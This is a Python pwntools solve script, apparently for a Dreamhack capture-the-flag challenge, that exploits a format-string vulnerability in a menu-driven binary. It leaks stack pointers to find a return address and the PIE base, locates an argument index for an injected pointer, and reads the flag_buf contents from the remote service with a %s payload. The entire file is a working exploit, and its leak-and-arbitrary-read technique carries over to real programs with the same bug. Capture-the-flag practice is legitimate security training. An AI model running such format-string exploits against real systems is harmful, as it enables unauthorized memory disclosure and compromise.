#!/usr/bin/env python3
from __future__ import annotations

import re
import sys
from dataclasses import dataclass

from pwn import ELF, context, p64, process, remote


BIN_PATH = "/workspace/chall/deploy/chall"
HOST = "host8.dreamhack.games"
PORT = 13343


context.binary = BIN_PATH
context.log_level = "error"

elf = ELF(BIN_PATH)


def recv_prompt(io):
    io.recvuntil(b"> ")


def menu_flag(io):
    recv_prompt(io)
    io.send(b"1\n")


def menu_fsb(io, payload: bytes):
    recv_prompt(io)
    io.send(b"2\n" + payload)


def leak_idx_find_ret(io, max_n: int = 40) -> int:
    # Look for an address that looks like a return address into main after calling fsb:
    # main+131 returns to main+? around 0x143e, low 12 bits == 0x43e.
    for n in range(1, max_n + 1):
        payload = f"LEAK%{n}$pEND".encode()
        menu_fsb(io, payload)
        out = io.recvuntil(b"END", drop=False)
        m = re.search(rb"LEAK(0x[0-9a-fA-F]+|nil)END", out)
        if not m:
            continue
        s = m.group(1)
        if s == b"nil":
            continue
        val = int(s, 16)
        if (val & 0xFFF) == 0x43E:
            return n
    raise RuntimeError("No return-address-like leak index found")


def leak_ptr(io, n: int) -> int:
    payload = f"LEAK%{n}$pEND".encode()
    menu_fsb(io, payload)
    out = io.recvuntil(b"END", drop=False)
    m = re.search(rb"LEAK(0x[0-9a-fA-F]+|nil)END", out)
    if not m or m.group(1) == b"nil":
        raise RuntimeError(f"Failed to leak %{n}$p")
    return int(m.group(1), 16)


def find_arg_index_for_appended_qword(io, marker: int = 0x4141414142424242, max_k: int = 40) -> int:
    marker_bytes = p64(marker)
    for k in range(1, max_k + 1):
        fmt = f"MARK%{k}$pEND".encode()
        # Ensure marker is in the same stack frame as printf's argument reads.
        payload = fmt.ljust(0x40, b"A") + marker_bytes
        menu_fsb(io, payload)
        out = io.recvuntil(b"END", drop=False)
        m = re.search(rb"MARK(0x[0-9a-fA-F]+|nil)END", out)
        if not m or m.group(1) == b"nil":
            continue
        val = int(m.group(1), 16)
        if val == marker:
            return k
    raise RuntimeError("No stack argument index found for appended qword")


@dataclass
class ExploitParams:
    ret_idx: int
    ret_addr: int
    pie_base: int
    arg_idx_for_ptr: int
    flag_addr: int


def compute_params(io) -> ExploitParams:
    menu_flag(io)

    # Indices are typically stable across runs (same binary/ABI).
    # Prefer fast path; fall back to brute-force if needed.
    ret_idx = 19
    try:
        ret_addr = leak_ptr(io, ret_idx)
        if (ret_addr & 0xFFF) != 0x43E:
            raise RuntimeError("ret leak sanity check failed")
    except Exception:
        ret_idx = leak_idx_find_ret(io)
        ret_addr = leak_ptr(io, ret_idx)
    pie_base = ret_addr - 0x143E
    flag_addr = pie_base + elf.symbols["flag_buf"]

    arg_idx_for_ptr = 14
    try:
        # quick sanity: ensure we can observe our marker at the expected index
        _ = None
        marker = 0x4141414142424242
        marker_bytes = p64(marker)
        fmt = f"MARK%{arg_idx_for_ptr}$pEND".encode()
        payload = fmt.ljust(0x40, b"A") + marker_bytes
        menu_fsb(io, payload)
        out = io.recvuntil(b"END", drop=False)
        m = re.search(rb"MARK(0x[0-9a-fA-F]+|nil)END", out)
        if not m or m.group(1) == b"nil" or int(m.group(1), 16) != marker:
            raise RuntimeError("arg index sanity check failed")
    except Exception:
        arg_idx_for_ptr = find_arg_index_for_appended_qword(io)

    return ExploitParams(
        ret_idx=ret_idx,
        ret_addr=ret_addr,
        pie_base=pie_base,
        arg_idx_for_ptr=arg_idx_for_ptr,
        flag_addr=flag_addr,
    )


def read_flag(io, params: ExploitParams) -> bytes:
    menu_flag(io)

    fmt = f"%{params.arg_idx_for_ptr}$s".encode()
    payload = fmt.ljust(0x40, b"B") + p64(params.flag_addr)
    menu_fsb(io, payload)
    out = io.recvrepeat(0.3)
    # flag is usually like DH{...}
    m = re.search(rb"DH\{[^}]+\}", out)
    if not m:
        # fallback: take printable prefix
        return out
    return m.group(0)


def main():
    mode = (sys.argv[1] if len(sys.argv) > 1 else "remote").strip().lower()
    if mode not in {"local", "remote"}:
        print("Usage: solve.py [local|remote]")
        raise SystemExit(2)

    if mode == "local":
        io = process(BIN_PATH, cwd="/workspace/chall/deploy")
    else:
        io = remote(HOST, PORT)
    io.timeout = 1.0

    try:
        params = compute_params(io)
        flag = read_flag(io, params)
        sys.stdout.buffer.write(flag + b"\n")
    finally:
        try:
            io.close()
        except Exception:
            pass


if __name__ == "__main__":
    main()
